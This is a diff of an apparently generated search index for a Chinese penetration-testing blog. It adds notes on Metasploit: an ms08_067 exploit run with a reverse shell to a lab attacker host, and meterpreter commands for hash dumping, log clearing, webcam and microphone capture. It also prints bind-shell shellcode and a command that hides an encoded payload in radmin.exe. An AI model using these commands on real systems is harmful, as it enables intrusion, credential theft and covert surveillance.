@@ -47,19 +47,19 @@
       
         <tags>
             
-            <tag> 免杀 </tag>
-            
-            <tag> MSF </tag>
-            
-            <tag> msfvenom </tag>
-            
-            <tag> payload </tag>
-            
             <tag> python </tag>
+            
+            <tag> 免杀 </tag>
             
             <tag> backdoor-factory </tag>
             
+            <tag> msfvenom </tag>
+            
+            <tag> MSF </tag>
+            
             <tag> bdfproxy </tag>
+            
+            <tag> payload </tag>
             
             <tag> arpspoof </tag>
             
@@ -88,17 +88,17 @@
       
         <tags>
             
+            <tag> python </tag>
+            
             <tag> 免杀 </tag>
             
             <tag> msfvenom </tag>
             
-            <tag> Veil-Framework </tag>
-            
             <tag> payload </tag>
             
-            <tag> python </tag>
-            
             <tag> passing-the-hash </tag>
+            
+            <tag> Veil-Framework </tag>
             
             <tag> shellter </tag>
             
@@ -129,19 +129,19 @@
       
         <tags>
             
+            <tag> python </tag>
+            
             <tag> 免杀 </tag>
+            
+            <tag> msfvenom </tag>
             
             <tag> MSF </tag>
             
-            <tag> msfvenom </tag>
+            <tag> payload </tag>
             
             <tag> Veil-Framework </tag>
             
             <tag> Hyperion </tag>
-            
-            <tag> payload </tag>
-            
-            <tag> python </tag>
             
             <tag> Veil-evasion </tag>
             
@@ -170,17 +170,17 @@
       
         <tags>
             
+            <tag> C </tag>
+            
             <tag> 免杀 </tag>
             
-            <tag> MSF </tag>
-            
             <tag> msfvenom </tag>
+            
+            <tag> MSF </tag>
             
             <tag> Hyperion </tag>
             
             <tag> strings </tag>
-            
-            <tag> C </tag>
             
             <tag> gcc </tag>
             
@@ -226,6 +226,109 @@
     
     
     <entry>
+      <title>meterpreter基本命令及其Python扩展</title>
+      <link href="/2016/03/06/MsF/meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6Python%E6%89%A9%E5%B1%95/"/>
+      <url>/2016/03/06/MsF/meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6Python%E6%89%A9%E5%B1%95/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a><strong>Meterpreter</strong></h4><p><strong>高级,动态,可扩展的payload</strong></p><ul><li>基于meterpreter上下文利用更多漏洞发起攻击</li><li>后渗透测试阶段一站式操作界面</li></ul><p><strong>完全基于内存的DLL注入式payload</strong> (不写硬盘)</p><ul><li>注入合法系统进程并建立stager</li><li>基于Stager上传和预加载DLL进行扩展模块的注入(客户端API)</li><li>基于Stager建立的socket连接建立加密的TLS/1.0通信隧道</li><li>利用TLS隧道进一步加载后续扩展模块(避免网络取证)</li></ul><p><strong>服务端使用C语言编写</strong></p><ul><li>客户端提供基于ruby的全特性API(支持任何语言)</li></ul><h4 id="meterpreter基本命令"><a href="#meterpreter基本命令" class="headerlink" title="meterpreter基本命令"></a><strong>meterpreter基本命令</strong></h4><p><strong>以ms08_067漏洞测试获取一个meterpreter会话</strong></p><pre><code>msfconsolesearch 08-067use exploit/windows/smb/ms08_067_netapishow optionsset rhost 192.168.254.113set target 34set paylaod windows/meterpreter/reverse_tcpset lhsot 192.168.254.118set lport 6666exploit -j sessions -i 1</code></pre><p><strong>基本命令</strong></p><pre><code>help / ?        #查看使用帮助    background        #将meterpreter终端隐藏在后台（快捷键ctrl+z）sessions        #查看已经成功获得的会话，如果想继续与某会话交互，可以使用sessions -i 命令.quit / exit        #直接关闭当前的meterpreter会话，返回MSF终端.run                #执行meterpreter模块或脚本run post/windows/gather/hashdump    #获取目标机器hash密码bgrun            #后台执行meterpreter模块或脚本bgrun vnc        #VNC远程监控bgrun service_manager -l     #查看目标系统已有服务,可以创建自启动或开启停止服务.bglist            #提供所有正在运行的后台脚本的列表bgkill             #杀死一个背景 meterpreter 脚本channel         #显示活动频道interact         #与通道进行交互write             #将数据写入到一个通道read             #从通道读取数据close             #关闭通道use             #加载 meterpreter 的扩展clearev            #清除目标系统日志shell            #获取目标系统的控制台shell.resource -r r.txt    #调用资源文件ldletime        #查看目标机器空闲时间,判断电脑前是否有人record_mic        #录制目标麦克风,窃取声音信息webcam_list     #列出摄像头设备webcam_snap -i 1 -v false    #使用摄像头监控irb                #在meterpreter会话与ruby终端交互.load            #加载扩展插件</code></pre><p><strong>文件系统命令</strong></p><pre><code>cd            #访问目标文件夹路径pwd            #查看目标当前路径#攻击者本机命令前加l,意为local本地lcd         #访问攻击者本机路径lpwd        #查看攻击者本机路径ls / dir    #查看目标文件列表.cat            #查看目标文件内容.mkdir        #在目标机器创建目录.mv            #移动文件或改名getwd        #获得目标机器上当前的工作目录，getlwd，这个命令可以获得当前系统的工作目录.upload        #可以上传文件或文件夹到目标机器上;upload 要上传的文件 C:\Users\buzz\Desktopdownload    #从目标机器上下载文件或文件夹，注意windows路径要用双斜杠进行转义. download C:\\test.txt /root/home/testedit        #调用vi编辑器，对目标机器上的文件进行编辑;edit c:\\windows\\system32\\drivers\\etc\\hostssearch        #可通过search -h查看帮助信息,参数-d指定搜索的起始目录或驱动，如果为空，将进行全盘搜索；参数-f指定搜索的文件或部分文件名，支持星号(*)匹配；参数-r递归搜索子目录.search -d c:\\windows -f *.txtrm / del    #删除目标机器的文件.rmdir /s/q c:\\test    #进入shell后使用此命令可以删除目录下的所有文件和文件夹，/s表示所有子目录和文件/q表示安静模式，不显示yes or no.</code></pre><p><strong>网络命令</strong></p><pre><code>arp            #查看APR缓存netstat        #查看网络连接情况ifconfig    #查看目标机器网络接口信息portfwd        #它是meterpreter自带的端口转发器，用于把目标机器的端口转发到本地端口；假设目标机开放了3389端口，使用如下命令将其转发到本地3456端口：portfwd add -l 3456 -p 3389 -r 192.168.88.110rdesktop -u 用户名 -p 密码 ip:端口          #连接开启远程桌面的windows系统.route        #显示目标机器的路由信息.</code></pre><p><strong>系统命令</strong></p><pre><code>ps            #用于获得目标主机上正在运行的进程信息.migrate pid    #将Meterpreter会话从一个进程迁移到另一个进程的内存空间中，可以配合ps -ef |grep explorer.exeexecute        #在目标机器上执行文件.    execute -H -i -f cmd.exe         #直接与cmd进行交互,参数-H 表示隐藏执行 -i 表示直接与cmd交互.#另外execute命令的-m参数支持直接从内存中执行攻击者的可执行文件.execute -H -m -d regedit.exe -f hidden_shell.exegetprivs    #查看获取的权限getproxy    #获取代理信息getsystem    #获取系统权限getpid        #获得当前会话所在进程的PID值.kill        #用于终结指定的PID进程.getuid        #用于获得运行meterpreter会话的用户名，从而查看当前会话具有的权限.sysinfo        #用于得到目标系统的一些信息，例如机器名，操作系统等.show_mount    #展示已挂载磁盘reboot        #重启目标机器shutdown    #关闭目标机器</code></pre><h4 id="Meterpreter-python扩展"><a href="#Meterpreter-python扩展" class="headerlink" title="Meterpreter python扩展"></a><strong>Meterpreter python扩展</strong></h4><ul><li>2015年11月份,来自社区的贡献</li><li>无需运行环境,在客户端运行原生python代码</li></ul><pre><code>load pythonhelppython_execute &quot;print(hello world)&quot;python_execute &quot;import os; cd=os.getcwd()&quot; -r cdpython_import -f find.py</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> MSF </tag>
+            
+            <tag> payload </tag>
+            
+            <tag> meterpreter </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MSF生成和使用payload</title>
+      <link href="/2016/03/05/MsF/MSF%E7%94%9F%E6%88%90%E5%92%8C%E4%BD%BF%E7%94%A8payload/"/>
+      <url>/2016/03/05/MsF/MSF%E7%94%9F%E6%88%90%E5%92%8C%E4%BD%BF%E7%94%A8payload/</url>
+      
+        <content type="html"><![CDATA[<h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a><strong>生成payload</strong></h4><pre><code>msfconsoleuse payload/windows/shell_bind_tcp        #选择使用payload模块generate            #生成默认输出ruby语言shellcodegenerate -f c        #生成C语言的shellcodegenerate -f python    #生成python语言shellcodegenerate -f jav        #生成java语言shellcodegenerate -f exe        #生成为EXE可执行文件generate -h</code></pre><ul><li><p>默认输出为ruby语言16进制shellcode</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># windows/shell_bind_tcp - 328 bytes</span></span><br><span class="line"><span class="comment"># https://metasploit.com/</span></span><br><span class="line"><span class="comment"># VERBOSE=false, LPORT=4444, RHOST=, PrependMigrate=false, </span></span><br><span class="line"><span class="comment"># EXITFUNC=process, CreateSession=true</span></span><br><span class="line">buf = </span><br><span class="line"><span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"</span> +</span><br><span class="line"><span class="string">"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"</span> +</span><br><span class="line"><span class="string">"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"</span> +</span><br><span class="line"><span class="string">"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"</span> +</span><br><span class="line"><span class="string">"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"</span> +</span><br><span class="line"><span class="string">"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"</span> +</span><br><span class="line"><span class="string">"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"</span> +</span><br><span class="line"><span class="string">"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"</span> +</span><br><span class="line"><span class="string">"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"</span> +</span><br><span class="line"><span class="string">"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32"</span> +</span><br><span class="line"><span class="string">"\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"</span> +</span><br><span class="line"><span class="string">"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"</span> +</span><br><span class="line"><span class="string">"\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68"</span> +</span><br><span class="line"><span class="string">"\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89\xe6"</span> +</span><br><span class="line"><span class="string">"\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7"</span> +</span><br><span class="line"><span class="string">"\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57"</span> +</span><br><span class="line"><span class="string">"\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89"</span> +</span><br><span class="line"><span class="string">"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7"</span> +</span><br><span class="line"><span class="string">"\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50"</span> +</span><br><span class="line"><span class="string">"\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"</span> +</span><br><span class="line"><span class="string">"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d"</span> +</span><br><span class="line"><span class="string">"\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff"</span> +</span><br><span class="line"><span class="string">"\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"</span> +</span><br><span class="line"><span class="string">"\x6f\x6a\x00\x53\xff\xd5"</span></span><br></pre></td></tr></table></figure></li><li><p>MSF自动选择编码模块绕过坏字符</p></li></ul><pre><code>generate -b &apos;\x00&apos;generate -b &apos;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&apos;generate -b &apos;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b\xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26&apos;</code></pre><p><strong>直接使用payload</strong></p><ul><li>手动指定编码模块</li></ul><pre><code>show encoders        #显示可用编码模块generate -e x86/nonalpha    #-e参数指定编码模块generate -b &apos;\x00&apos; -f exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -o /root/1.exenc targetIP 4444</code></pre><p><strong>NOP</strong>: no-operation / Next Operation (无任何操作)</p><ul><li>EIP返回到存储NOP sled的任意地址时将递增,最终导致shellcode执行</li></ul><pre><code>generate -s 14</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> payload </tag>
+            
+            <tag> ruby </tag>
+            
+            <tag> shellcode </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MSF之Exploit模块</title>
+      <link href="/2016/03/04/MsF/MSF%E4%B9%8BExploit%E6%A8%A1%E5%9D%97/"/>
+      <url>/2016/03/04/MsF/MSF%E4%B9%8BExploit%E6%A8%A1%E5%9D%97/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Exploit模块"><a href="#Exploit模块" class="headerlink" title="Exploit模块"></a><strong>Exploit模块</strong></h4><p><strong>Active Exploit</strong>    主动利用</p><pre><code>#smb漏洞,直接利用达到控制目标,类似永恒之蓝use exploit/windows/smb/psexec            set rhost 192.168.254.113set payload windows/shell/reverse_tcpset lhost 192.168.254.118set lport 4444set SMBUSER user1set SMBPASS pass1exploit</code></pre><p><strong>Passive Exploits</strong>    被动利用</p><pre><code>#针对早期IE6,IE7浏览器漏洞,诱使目标访问URL即可控制目标use exploit/windows/browser/ms07_017_ani_loadimage_chunksize    set URIPATH /set PAYLOAD windows/shell/reverse_tcpset LHOST 192.168.254.111set LPORT 4444exploit</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> exploit </tag>
+            
+            <tag> ms07_017 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>MSF基本使用和控制台命令</title>
       <link href="/2016/03/04/MsF/MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/"/>
       <url>/2016/03/04/MsF/MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/</url>
@@ -246,9 +349,9 @@
       
         <tags>
             
-            <tag> MSF </tag>
-            
             <tag> nmap </tag>
+            
+            <tag> MSF </tag>
             
             <tag> Metasploit </tag>
             
@@ -287,9 +390,9 @@
             
             <tag> payload </tag>
             
-            <tag> shellcode </tag>
-            
             <tag> exploit </tag>
+            
+            <tag> shellcode </tag>
             
         </tags>
       
@@ -415,11 +518,11 @@
       
         <tags>
             
+            <tag> squid3 </tag>
+            
             <tag> proxytunnel </tag>
             
             <tag> HTTP隧道 </tag>
-            
-            <tag> squid3 </tag>
             
         </tags>
       
@@ -510,17 +613,17 @@
             
             <tag> nc </tag>
             
-            <tag> ncat </tag>
-            
-            <tag> iodine </tag>
+            <tag> http代理 </tag>
             
             <tag> DNS隧道 </tag>
             
             <tag> 隧道嵌套 </tag>
             
-            <tag> ssh </tag>
+            <tag> ncat </tag>
             
-            <tag> http代理 </tag>
+            <tag> iodine </tag>
+            
+            <tag> ssh </tag>
             
         </tags>
       
@@ -549,15 +652,15 @@
             
             <tag> Kali </tag>
             
+            <tag> dns2tcp </tag>
+            
             <tag> squid3 </tag>
+            
+            <tag> http代理 </tag>
             
             <tag> DNS隧道 </tag>
             
             <tag> 隧道嵌套 </tag>
-            
-            <tag> http代理 </tag>
-            
-            <tag> dns2tcp </tag>
             
             <tag> Bodhi </tag>
             
@@ -590,9 +693,9 @@
             
             <tag> 端口转发 </tag>
             
-            <tag> VNC </tag>
-            
             <tag> SSH </tag>
+            
+            <tag> VNC </tag>
             
             <tag> proxychains </tag>
             
@@ -625,9 +728,9 @@
             
             <tag> 端口转发 </tag>
             
-            <tag> SSH </tag>
-            
             <tag> shell </tag>
+            
+            <tag> SSH </tag>
             
             <tag> 隧道 </tag>
             
@@ -804,13 +907,13 @@
             
             <tag> 离线密码破解 </tag>
             
-            <tag> Linux密码破解 </tag>
-            
             <tag> John </tag>
             
             <tag> 彩虹表 </tag>
             
             <tag> Ophcrack </tag>
+            
+            <tag> Linux密码破解 </tag>
             
             <tag> Windows密码 </tag>
             
@@ -948,11 +1051,11 @@
       
         <tags>
             
+            <tag> Linux密码破解 </tag>
+            
             <tag> hydra </tag>
             
             <tag> 在线密码破解 </tag>
-            
-            <tag> Linux密码破解 </tag>
             
         </tags>
       
@@ -1041,9 +1144,9 @@
       
         <tags>
             
-            <tag> DoS攻击 </tag>
-            
             <tag> 拒绝服务攻击 </tag>
+            
+            <tag> DoS攻击 </tag>
             
             <tag> ARP欺骗 </tag>
             
@@ -1247,9 +1350,9 @@
       
         <tags>
             
-            <tag> DoS攻击 </tag>
-            
             <tag> 拒绝服务攻击 </tag>
+            
+            <tag> DoS攻击 </tag>
             
             <tag> 入侵检测 </tag>
             
@@ -1282,9 +1385,9 @@
       
         <tags>
             
-            <tag> python </tag>
-            
             <tag> DoS攻击 </tag>
+            
+            <tag> python </tag>
             
             <tag> HULK </tag>
             
@@ -1321,13 +1424,13 @@
       
         <tags>
             
-            <tag> python </tag>
+            <tag> 拒绝服务攻击 </tag>
             
             <tag> DoS攻击 </tag>
             
-            <tag> 拒绝服务攻击 </tag>
-            
             <tag> 缓冲区溢出 </tag>
+            
+            <tag> python </tag>
             
             <tag> Slowhttptest </tag>
             
@@ -1362,11 +1465,11 @@
             
             <tag> 拒绝服务攻击 </tag>
             
+            <tag> NTP </tag>
+            
             <tag> UDP </tag>
             
             <tag> nmap </tag>
-            
-            <tag> NTP </tag>
             
         </tags>
       
@@ -1397,11 +1500,11 @@
             
             <tag> scapy </tag>
             
-            <tag> SNMP </tag>
-            
             <tag> UDP </tag>
             
             <tag> nmap </tag>
+            
+            <tag> SNMP </tag>
             
         </tags>
       
@@ -1428,11 +1531,11 @@
       
         <tags>
             
-            <tag> 拒绝服务攻击 </tag>
-            
             <tag> DNS </tag>
             
             <tag> dig </tag>
+            
+            <tag> 拒绝服务攻击 </tag>
             
             <tag> scapy </tag>
             
@@ -1461,11 +1564,11 @@
       
         <tags>
             
-            <tag> python </tag>
+            <tag> 拒绝服务攻击 </tag>
             
             <tag> DoS攻击 </tag>
             
-            <tag> 拒绝服务攻击 </tag>
+            <tag> python </tag>
             
             <tag> teardrop </tag>
             
@@ -1494,19 +1597,19 @@
       
         <tags>
             
-            <tag> python </tag>
+            <tag> 拒绝服务攻击 </tag>
+            
+            <tag> scapy </tag>
             
             <tag> DoS攻击 </tag>
             
-            <tag> 拒绝服务攻击 </tag>
-            
-            <tag> C </tag>
-            
-            <tag> scapy </tag>
+            <tag> python </tag>
             
             <tag> Smurf </tag>
             
             <tag> sockstress </tag>
+            
+            <tag> C </tag>
             
             <tag> TCP </tag>
             
@@ -1535,13 +1638,13 @@
       
         <tags>
             
-            <tag> python </tag>
-            
-            <tag> DoS攻击 </tag>
-            
             <tag> 拒绝服务攻击 </tag>
             
             <tag> scapy </tag>
+            
+            <tag> DoS攻击 </tag>
+            
+            <tag> python </tag>
             
             <tag> TCP </tag>
             
@@ -1570,13 +1673,13 @@
       
         <tags>
             
+            <tag> 拒绝服务攻击 </tag>
+            
             <tag> DoS攻击 </tag>
             
             <tag> DDoS攻击 </tag>
             
             <tag> CC </tag>
-            
-            <tag> 拒绝服务攻击 </tag>
             
             <tag> 缓冲区溢出 </tag>
             
@@ -1605,9 +1708,9 @@
       
         <tags>
             
-            <tag> python </tag>
-            
             <tag> 缓冲区溢出 </tag>
+            
+            <tag> python </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -2058,43 +2161,6 @@
     
     
     <entry>
-      <title>WAF扫描识别及负载均衡识别</title>
-      <link href="/2013/03/23/Information_Gethering/WAF%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB%E5%8F%8A%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/"/>
-      <url>/2013/03/23/Information_Gethering/WAF%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB%E5%8F%8A%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/</url>
-      
-        <content type="html"><![CDATA[<blockquote><h3 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a><strong>防火墙识别</strong></h3><p>通过检查回包,可能识别端口是否经过防火墙过滤<br>设备多种多样,结果存在一定误差</p></blockquote><table><thead><tr><th align="center">No.</th><th align="center">Send</th><th align="center">Response</th><th align="left">Type</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">syn</td><td align="center">No</td><td align="left">Filtered</td></tr><tr><td align="center">1</td><td align="center">ack</td><td align="center">rst</td><td align="left">Filtered</td></tr><tr><td align="center">2</td><td align="center">syn</td><td align="center">syn+ack/syn+rst</td><td align="left">Filtered</td></tr><tr><td align="center">2</td><td align="center">ack</td><td align="center">No</td><td align="left">Filtered</td></tr><tr><td align="center">3</td><td align="center">syn</td><td align="center">syn+ack/syn+rst</td><td align="left">Unfiltered/Open</td></tr><tr><td align="center">3</td><td align="center">ack</td><td align="center">rst</td><td align="left">Unfiltered/Open</td></tr><tr><td align="center">4</td><td align="center">syn</td><td align="center">No</td><td align="left">Closed</td></tr><tr><td align="center">4</td><td align="center">ack</td><td align="center">No</td><td align="left">Closed</td></tr></tbody></table><h4 id="python–scapy-firewall-detect-py-1-1-1-1-443"><a href="#python–scapy-firewall-detect-py-1-1-1-1-443" class="headerlink" title="python–scapy ./firewall_detect.py 1.1.1.1 443"></a><strong>python–scapy</strong> <code>./firewall_detect.py 1.1.1.1 443</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">3</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage - ./firewall_detect.py [Target IP] [Target Port]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example - ./firewall_detect.py 1.1.1.1 443"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example will determine if filtering exists on port 443 of host 10.0.0.5"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">port=int(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">ACK_response=sr1(IP(dst=ip)/TCP(dport=port,flags=<span class="string">'A'</span>),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">SYN_response=sr1(IP(dst=ip)/TCP(dport=port,flags=<span class="string">"S"</span>),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> (ACK_response==<span class="literal">None</span>) <span class="keyword">and</span> (SYN_response==<span class="literal">None</span>):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is either unstatefully filtered or host is down"</span></span><br><span class="line"><span class="keyword">elif</span> ((ACK_response==<span class="literal">None</span>) <span class="keyword">or</span> (SYN_response==<span class="literal">None</span>)) <span class="keyword">and</span> <span class="keyword">not</span> ((ACK_response==<span class="literal">None</span>) <span class="keyword">and</span> (SYN_response==<span class="literal">None</span>)):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Stateful filtering in place"</span></span><br><span class="line"><span class="keyword">elif</span> int(SYN_response[TCP].flags)==<span class="number">18</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is unfiltered and open"</span></span><br><span class="line"><span class="keyword">elif</span> int(SYN_response[TCP].flags)==<span class="number">20</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is unfiltered and closed"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Unable to determine if the port is filtered"</span></span><br></pre></td></tr></table></figure><h4 id="Nmap有系列防火墙过滤检测功能"><a href="#Nmap有系列防火墙过滤检测功能" class="headerlink" title="Nmap有系列防火墙过滤检测功能"></a><strong>Nmap</strong>有系列防火墙过滤检测功能</h4><pre><code>nmap -sA 192.168.254.254 -p 22</code></pre><blockquote><h4 id="负载均衡识别"><a href="#负载均衡识别" class="headerlink" title="负载均衡识别"></a><strong>负载均衡识别</strong></h4><p>广域网负载均衡<br>    DNS轮询<br>    一个域名解析多个A纪录<br>    智能DNS<br>服务器负载均衡<br>HTTP-Loadbalancing<br>    Nginx<br>    Apache</p></blockquote><h4 id="lbd"><a href="#lbd" class="headerlink" title="lbd"></a><strong>lbd</strong></h4><pre><code>lbd www.baidu.comlbd mail.163.com</code></pre><blockquote><h3 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a><strong>WAF识别</strong></h3></blockquote><h4 id="wafw00f-web应用防火墙识别"><a href="#wafw00f-web应用防火墙识别" class="headerlink" title="wafw00f web应用防火墙识别"></a><strong>wafw00f</strong> web应用防火墙识别</h4><pre><code>wafw00f -lwafw00f http://google.com</code></pre><h3 id="nmap-web应用防火墙识别"><a href="#nmap-web应用防火墙识别" class="headerlink" title="nmap web应用防火墙识别"></a><strong>nmap</strong> web应用防火墙识别</h3><pre><code>nmap google.com --script=http-waf-detect.nse</code></pre><h4 id="nmap所有参数-man-nmap"><a href="#nmap所有参数-man-nmap" class="headerlink" title="nmap所有参数 man nmap"></a><strong>nmap所有参数 man nmap</strong></h4><pre><code>-iL filename                   从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段-iR hostnum                    随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描--exclude host1[, host2]      从扫描任务中需要排除的主机--exculdefile exclude_file     排除文件中的IP,格式和-iL指定扫描文件的格式相同</code></pre><p><strong>主机发现</strong></p><pre><code>-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描-sn                     ping扫描,即主机发现-Pn                     不检测主机存活-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现-PE/PP/PM               使用ICMP echo, timestamp and netmask 请求包发现主机-PO[prococol list]      使用IP协议包探测对方主机是否开启-n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析--dns-servers 8.8.8.8     根据DNS服务地址扫描--system-dns            使用系统在DNS扫描--traceroute            路由追踪</code></pre><p><strong>扫描技巧</strong></p><pre><code>-sS/sT/sA/sW/sM                 TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描-sU                             UDP扫描-sN/sF/sX                       TCP Null，FIN，and Xmas扫描--scanflags                     自定义TCP包中的flags-sI zombie host[:probeport]     Idlescan-sY/sZ                          SCTP INIT/COOKIE-ECHO 扫描-sO                             使用IP protocol 扫描确定目标机支持的协议类型-b “FTP relay host”             使用FTP bounce scan</code></pre><p><strong>指定端口和扫描顺序</strong></p><pre><code>-p                      特定的端口 -p80,443 或者 -p1-65535-p U:PORT               扫描udp的某个端口, -p U:53-F                      快速扫描模式,比默认的扫描端口还少-r                      不随机扫描端口,默认是随机扫描的--top-ports &quot;number&quot;    扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个--port-ratio &quot;ratio&quot;    